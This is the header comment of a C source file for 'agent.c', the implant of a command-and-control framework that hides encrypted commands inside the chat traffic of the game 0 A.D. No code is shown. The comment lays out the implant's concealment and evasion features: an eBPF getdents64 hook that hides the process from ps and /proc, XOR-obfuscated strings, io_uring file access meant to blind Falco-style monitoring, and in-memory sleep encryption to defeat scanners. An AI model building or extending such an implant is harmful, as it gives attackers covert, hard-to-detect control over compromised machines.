/*
 * agent.c — 0adC2 agent
 *
 * This is the implant (agent) side of a C2 (Command & Control) framework.
 * It disguises itself as a legitimate player in the open-source game "0 A.D.",
 * using the game's own network protocol (ENet/UDP + NMT_CHAT messages) to
 * carry encrypted commands and responses, invisible to an analyst watching
 * normal network traffic.
 *
 * Notable features:
 *
 *   - Ephemeral ECDH X25519:
 *       Each session uses a fresh Diffie-Hellman keypair (X25519 curve).
 *       The controller and agent derive a shared secret without transmitting it.
 *       "Ephemeral" means the key is discarded after the session → forward secrecy
 *       (even if the binary is captured, past sessions cannot be decrypted).
 *
 *   - XSalsa20-Poly1305 (secretbox) replaces RC4 post-DH:
 *       After the DH handshake, all payloads are encrypted with XSalsa20
 *       (a stream cipher) and authenticated with Poly1305 (a MAC).
 *       This is libsodium's "secretbox" — both confidential and tamper-proof.
 *       RC4 (weaker, static key) is only used before DH completes.
 *
 *   - RSP streaming: no more MAX_OUTPUT buffer (chunk_buf[160] per job):
 *       Command output is split into 160-byte chunks and streamed back
 *       progressively, so large outputs (find, cat big files) don't get truncated.
 *
 *   - RSP header: aid8 + jid4 + seq4 + tot4 + secretbox(chunk):
 *       Each chunk carries: agent-id (8 hex chars), job-id (4), sequence
 *       number (4), total chunks (4, 0 if not final), then the encrypted chunk.
 *
 *   - DH_OK confirmation (jid=0, secretbox) after key exchange:
 *       A short "OK" message encrypted with the new session key confirms to
 *       the controller that key exchange succeeded.
 *
 *   - eBPF process hider: getdents64 hook, invisible to ps/top/ls /proc:
 *       An eBPF (in-kernel) program hooks getdents64 (the syscall behind
 *       readdir). It filters out the agent's PID from /proc → the process
 *       is invisible to ps, top, /proc/PID browsing, etc.
 *
 *   - Debug strings XOR-obfuscated (SB_KEY + PN_KEY):
 *       All sensitive strings (paths, command names, error messages) are
 *       stored XOR-encrypted in the binary and decoded at runtime.
 *       The keys SB_KEY and PN_KEY are randomized at each build → different
 *       binary each time (strings(1) reveals nothing useful).
 *
 *   - io_uring for all sandbox file access (invisible to Falco):
 *       io_uring is a Linux kernel interface (added in 5.1) for async I/O.
 *       Because it uses a shared memory ring instead of direct syscalls,
 *       EDR tools that hook openat/read/write kprobes (like Falco) are blind
 *       to file operations performed through io_uring.
 *
 *   - XOR sleep mask (SilentPulse / Gargoyle pattern, io_uring timeout):
 *       During sleep/idle periods, the agent's .text (code) section is
 *       XOR-encrypted in-memory (SilentPulse technique), making it
 *       unrecognizable to memory scanners (EDR/AV that scan for known
 *       shellcode/malware signatures while the process is idle).
 */

